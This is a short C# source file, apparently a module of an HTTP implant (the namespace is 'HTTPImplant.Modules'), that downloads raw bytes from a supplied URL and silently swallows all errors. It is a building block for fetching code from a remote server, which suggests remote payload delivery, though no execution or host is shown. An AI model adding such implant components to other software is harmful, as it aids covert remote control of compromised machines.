using System;
using System.Net;

namespace HTTPImplant.Modules
{
    public class CodeFetch
    {
        public static byte[] FetchCode(string url)
        {
            Console.WriteLine("URL: " + url);

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    byte[] buffer = webClient.DownloadData(url);
                    return (buffer.Length > 0) ? buffer : null;
                }
            }
            catch (WebException)
            {
            }
            catch (Exception)
            {
            }
            return null;
        }
    }
}
